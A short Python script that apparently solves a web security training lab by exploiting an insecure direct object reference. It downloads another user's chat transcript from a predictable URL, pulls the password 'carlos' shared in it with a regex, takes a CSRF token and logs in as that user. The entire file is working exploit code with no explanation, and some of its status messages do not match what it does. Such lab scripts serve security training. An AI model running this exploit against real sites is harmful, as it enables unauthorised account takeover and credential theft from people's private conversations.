import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def get_csrf_token(url,s):
    req = s.get(url,proxies=proxies,verify=False)
    soup = BeautifulSoup(req.text,'lxml')
    csrf = soup.find('input',{'name':'csrf'})['value']
    return csrf

def login_carlos(url,s,password):
    ##& get csrf token first 
    login_url = url + '/login'
    csrf= get_csrf_token(login_url,s)
    data = {
        'csrf':csrf,
        'username':'carlos',
        'password':password
    }
    req = s.post(login_url,data=data,proxies=proxies,verify=False)
    res = req.text
    if "Log out" in res:
        print("(+) Successfully logged in to carlos")
        print("(+) Lab Solved!")
    else:
        print("Can't login with extracted password!")

##&=======================================================================
        
def get_carlos_password(url,s):
    transcript_url = url + '/download-transcript/1.txt'
    req = s.get(transcript_url,proxies = proxies,verify=False)
    if req.status_code==200:
        print("(+) Successfully went to path of transcript")
        print("(+) Trying to extract passwords from transcript...")
        soup = BeautifulSoup(req.text,'lxml')
        password_line = soup.find(string=re.compile("You: Ok so my password is "))
        password = re.search(r"You: Ok so my password is (.*)\.",password_line).group(1)
        print("(+) Successfully extracted password from transcript")
        print("(+) Trying to login with extracted password...")
        login_carlos(url,s,password)
    else:
        print("(+) Cannot login with")

        

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0].split('/')[-1]} URL")
        print(f"Example: {sys.argv[0].split('/')[-1]} www.example.com")
        sys.exit(-1)
    
    print("(+) Finding admin panel...")
    url = sys.argv[1]
    s = requests.Session()
    get_carlos_password(url, s)



if __name__ == '__main__':
    main()